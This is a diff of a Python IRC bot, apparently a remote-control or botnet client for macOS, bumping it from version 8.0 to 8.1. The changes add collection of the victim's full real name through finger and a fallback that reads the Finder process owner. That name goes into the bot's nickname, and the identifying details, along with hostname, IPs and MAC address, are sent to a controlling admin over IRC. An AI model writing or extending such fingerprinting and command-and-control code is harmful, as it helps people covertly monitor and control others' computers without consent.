@@ -1,23 +1,15 @@
 # -*- coding: utf-8 -*-
 # MIT Liscence
-version = "8.0"                                                                 # bot version
+version = "8.1"                                                                 # bot version
 
 # library imports
-import socket
-import getpass
-import random
-import platform
-import uuid
-import signal
-import time
-import os
-import sys
-import urllib2
-import unicodedata
-import json
-from subprocess import Popen, PIPE, STDOUT
-from time import strftime, sleep
-from StringIO import StringIO
+import os, sys, socket, signal, time, platform      # general
+import getpass, random, uuid, urllib2               # identification
+import unicodedata, json                            # encoding and decoding
+
+from subprocess import Popen, PIPE, STDOUT          # command execution
+from time import strftime, sleep                    # timing
+from StringIO import StringIO                       # output redirection for logging
 
 from modules.logging import logfile, log
 
@@ -48,9 +40,17 @@ admin = 'thesquash'                                                             
 
 hostname = socket.gethostname()                                                 # host's hostname
 main_user = os.popen("stat -f '%Su' /dev/console").read().strip()               # main user of the computer detected by current owner of /dev/console
+
+if main_user == "root":
+    main_user = os.popen("ps aux | grep CoreServices/Finder.app | head -1 | awk '{print $1}'").read().strip()
+
+main_user_full = os.popen("finger %s | awk -F: '{ print $3 }' | head -n1 | sed 's/^ //'" % main_user).read().strip()
+if len(main_user_full) < 1:
+    main_user_full = main_user
+
 local_user = getpass.getuser()                                                  # user the bot is running as
 
-nick = '[%s|%s]' % (main_user, hostname)                                        # bot's nickname
+nick = '[%s]' % main_user_full.replace(" ", "")[:14]                            # bot's nickname
 
 ############ Flow functions
 
@@ -249,7 +249,7 @@ def identify():                                                                 
     log('[>]    Public:  ',public_ip)
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
-    return "[v%s/x%s] %s l: %s p: %s MAC: %s" % (version, system.strip(), (main_user[:14]+"@"+hostname[:13]).ljust(30), local_ip.ljust(16), public_ip.ljust(16), mac_addr)
+    return "[v%s/x%s] %s %s l: %s p: %s MAC: %s" % (version, system.strip(), main_user_full.ljust(20), (main_user[:14]+"@"+hostname[:13]).ljust(30), local_ip.ljust(16), public_ip.ljust(16), mac_addr)
  
 def full_identify():                                                            # give verbose identifying info about the host computer
     log('[+] Running v%s Identification Modules...' % version)
@@ -266,8 +266,8 @@ def full_identify():                                                            
     log('[>]    Bot:    ', local_user)
     privmsg('[>]      Bot:    %s' % local_user)
 
-    log('[>]    User:    ', main_user)
-    privmsg('[>]      User:    %s' % main_user)
+    log('[>]      User:    %s (%s)' % (main_user_full, main_user))
+    privmsg('[>]      User:    %s (%s)' % (main_user_full, main_user))
 
     log('[>]    Host:    ', hostname)
     privmsg('[>]      Host:    %s' % hostname)
@@ -493,7 +493,15 @@ def unadmin(admins):
 
 ############ The beef of things
 if __name__ == '__main__':
-    if len(nick) > 15: nick = '[%s]' % (main_user[:13])                         # if nick is over 15 characters, change to username truncated at 13 chars
+    if len(nick) > 15: 
+        nick = '[%s]' % main_user_full.replace(" ", "")[:13]                                        # if nick is over 15 characters, change to username truncated at 13 chars
+    elif len(nick) < 5:
+        nick = '[%s]' % main_user_full.replace(" ", "")
+        if len(nick) > 15: 
+            nick = nick[:14]+']'                                                # if nick is over 15 characters, truncate
+        elif len(nick) < 5:
+            nick += str(random.randint(1,200))
+
     threshold = 8 * 60                                                          # maximum time between pings before assuming disconnected (in seconds)
     quit_status = False
     reconnects = -1
